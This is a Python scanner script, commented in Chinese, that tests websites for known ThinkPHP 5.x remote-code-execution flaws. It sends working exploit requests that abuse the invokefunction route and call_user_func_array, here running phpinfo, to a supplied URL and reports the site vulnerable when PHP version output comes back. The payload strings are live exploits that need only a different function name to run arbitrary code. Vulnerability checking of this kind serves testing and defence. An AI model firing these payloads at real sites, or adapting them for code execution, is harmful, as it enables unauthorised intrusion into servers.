# coding=utf-8
# Author: HSJ
# 2023/9/18 16:15
# 检测thinkphp的漏洞
import requests


class TpTools:

    def __init__(self, url):
        self.__url = url
        self.__payloads = {
            "Tp5122": [
                r'?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
            ],
            "TP5018": [
                r'?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=-1'
            ],
            "TP5019": [
                r'?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=-1'
            ]
        }

        # 做一个序号和版本的映射
        self.__num_version = {}

        self.__flag = "PHP Version"

        # 记录最大的选择
        self.__max_num = 0

    def output_version(self):
        """
        输出版本选择
        :return:
        """
        # 获取payloads字典中的key
        keys = list(self.__payloads.keys())
        num = 1
        for k in keys:
            print(f"{num}.{k}")
            self.__num_version[num] = k
            num += 1
        print(f"{num}.全部检测！")
        self.__max_num = num

    def check_version(self, num):
        """
        直接检测
        :param num:
        :return:
        """
        if int(num) == self.__max_num:
            # 全部检测直接取payloads
            for version, payloads in self.__payloads.items():
                for p in payloads:
                    url = self.__url + p
                    res = requests.get(url)
                    html = res.content.decode("utf-8")

                    if self.__flag in html:
                        print(f"【{version}】:存在漏洞!")
                    else:
                        print(f"【{version}】:不存在漏洞!")

        else:
            # 将url和payload进行结合
            # 通过num去取版本
            version = self.__num_version[int(num)]
            # 再通过版本去取payload
            payloads = self.__payloads[version]
            for p in payloads:
                url = self.__url + p
                res = requests.get(url)
                html = res.content.decode("utf-8")

                if self.__flag in html:
                    print(f"【{version}】:存在漏洞!")
                else:
                    print(f"【{version}】:不存在漏洞!")





